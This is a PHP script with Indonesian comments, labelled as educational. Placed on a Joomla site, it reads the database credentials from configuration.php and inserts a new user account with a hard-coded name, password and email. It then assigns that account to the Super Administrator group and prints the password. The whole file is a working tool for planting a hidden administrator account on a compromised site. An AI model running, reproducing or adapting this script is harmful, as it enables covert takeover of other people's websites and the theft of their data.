<?php
// MODIFIED FOR JOOMLA - EDUKASI SAJA

// Path ke file configuration.php Joomla
$config_path = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';

// Data pengguna baru
$username = 'zeroing';
$password = 'Kakekterbang07#';
$email = 'askurmom007@proton.me';
$name = 'Staff';

if (file_exists($config_path)) {
    // Baca file configuration.php
    $config_content = file_get_contents($config_path);
    
    // Ekstrak konfigurasi database (cara sederhana)
    preg_match('/public \$db = \'([^\']+)\'/', $config_content, $db_matches);
    preg_match('/public \$dbprefix = \'([^\']+)\'/', $config_content, $prefix_matches);
    preg_match('/public \$user = \'([^\']+)\'/', $config_content, $user_matches);
    preg_match('/public \$password = \'([^\']+)\'/', $config_content, $pass_matches);
    preg_match('/public \$host = \'([^\']+)\'/', $config_content, $host_matches);
    
    $database = $db_matches[1] ?? '';
    $prefix = $prefix_matches[1] ?? 'jos_';
    $db_user = $user_matches[1] ?? '';
    $db_pass = $pass_matches[1] ?? '';
    $db_host = $host_matches[1] ?? 'localhost';
    
    // Koneksi ke database
    $conn = @mysqli_connect($db_host, $db_user, $db_pass, $database) or die('Koneksi gagal');
    
    // **PERUBAHAN 1: Struktur tabel users JOOMLA berbeda**
    // Joomla pakai kolom: id, name, username, email, password, block, registerDate, lastvisitDate, activation, params, etc.
    $hashed_password = md5($password); // Joomla versi lama pakai MD5
    // Untuk Joomla 3.x+ sebaiknya pakai bcrypt, tapi MD5 masih support untuk legacy
    
    $sqlUser = "INSERT INTO {$prefix}users 
                (name, username, email, password, block, registerDate, params) 
                VALUES 
                ('$name', '$username', '$email', '$hashed_password', '0', NOW(), '')";
    
    $result = @mysqli_query($conn, $sqlUser) or die(mysqli_error($conn));
    
    if ($result) {
        $userId = mysqli_insert_id($conn);
        echo "Berhasil membuat user: $username<br>";
        
        // **PERUBAHAN 2: Joomla pakai user_usergroup_map untuk role**
        // Group ID 8 = Super Administrator di Joomla
        $sqlGroup = "INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES ($userId, 8)";
        @mysqli_query($conn, $sqlGroup) or die(mysqli_error($conn));
        
        echo "User ditambahkan sebagai Super Administrator!<br>";
        echo "Password: $password";
    } else {
        echo "Gagal membuat user";
    }
    
    mysqli_close($conn);
} else {
    echo 'File configuration.php tidak ditemukan';
}
?>
